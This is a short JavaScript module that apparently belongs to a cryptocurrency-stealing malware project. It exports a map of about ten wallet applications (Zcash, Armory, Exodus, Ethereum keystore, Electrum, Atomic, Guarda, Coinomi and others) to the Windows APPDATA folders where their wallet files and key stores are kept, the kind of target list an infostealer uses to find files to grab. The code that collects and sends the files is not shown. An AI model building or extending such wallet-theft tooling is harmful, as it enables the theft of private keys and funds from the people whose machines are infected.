module.exports = (client) => {
    return {
        directory: {
            "Zcash": `${process.env.APPDATA}\\Zcash`,
            "Armory": `${process.env.APPDATA}\\Armory`,
            "Bytecoin": `${process.env.APPDATA}\\bytecoin`,
            "Jaxx": `${process.env.APPDATA}\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb`,
            "Exodus": `${process.env.APPDATA}\\Exodus\\exodus.wallet`,
            "Ethereum": `${process.env.APPDATA}\\Ethereum\\keystore`,
            "Electrum": `${process.env.APPDATA}\\Electrum\\wallets`,
            "AtomicWallet": `${process.env.APPDATA}\\atomic\\Local Storage\\leveldb`,
            "Guarda": `${process.env.APPDATA}\\Guarda\\Local Storage\\leveldb`,
            "Coinomi": `${process.env.APPDATA}\\Coinomi\\Coinomi\\wallets`,
        },
    }
}